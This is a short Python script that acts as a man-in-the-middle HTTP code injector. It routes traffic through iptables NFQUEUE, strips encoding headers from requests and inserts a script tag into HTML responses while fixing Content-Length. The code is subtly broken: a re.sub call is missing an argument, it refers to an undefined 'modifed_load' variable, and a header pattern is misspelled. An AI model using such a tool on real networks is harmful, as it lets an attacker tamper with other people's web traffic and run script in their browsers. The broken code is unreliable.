#!/usr/bin/env python3

import netfilterqueue  # For iptables queue management
import scapy.all as scapy
import re

# Command to create iptables queue:
# sudo iptables -I FORWARD -j NFQUEUE --queue-num 0  (For forwarding packets)
# sudo iptables -I INPUT -j NFQUEUE --queue-num 0   (For local device)
# sudo iptables -I OUTPUT -j NFQUEUE --queue-num 0  (For local device)
# sudo iptables --flush (To reset before running)



def set_load(packet, load):
    """Modify the packet payload and recalculate necessary fields."""
    packet[scapy.Raw].load = load.encode()  # Convert string to bytes

    del packet[scapy.IP].len  # Remove checksums and length so Scapy can recalculate
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum

    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())  # Convert raw packet to Scapy packet

    if scapy_packet.haslayer(scapy.Raw):  # Check if the packet has a Raw layer
        try:
            load = scapy_packet[scapy.Raw].load.decode()
            if scapy_packet[scapy.TCP].dport == 80:
                print("[+] Request")
                load = re.sub("Accept Encoding:.*?\\r\\n", "", load)
                load = re.sub("HTTP/1.1","HTTP/1.0")


            elif scapy_packet[scapy.TCP].sport == 80:
                print("[+] Response")
                injection_code = "<script>alert('test')</script>"
                load = load.replace("</body>", injection_code + "</body>")
                content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
                if content_length_search and "text/html" in load:
                    content_length = content_length_search.group(1)
                    new_content_length = int(content_length) + len(injection_code)
                    load = load.replace(content_length, str(new_content_length))

            if load != scapy_packet[scapy.Raw].load:
                new_packet = set_load(scapy_packet, modifed_load)
                packet.set_payload(bytes(new_packet))
        except UnicodeDecodeError:
            pass
    packet.accept()  # Forward packet


queue = netfilterqueue.NetfilterQueue()  # Initialize Netfilter queue
queue.bind(0, process_packet)  # Bind queue number 0 with callback function
print("[+] Waiting for packets...")
queue.run()  # Start processing packets
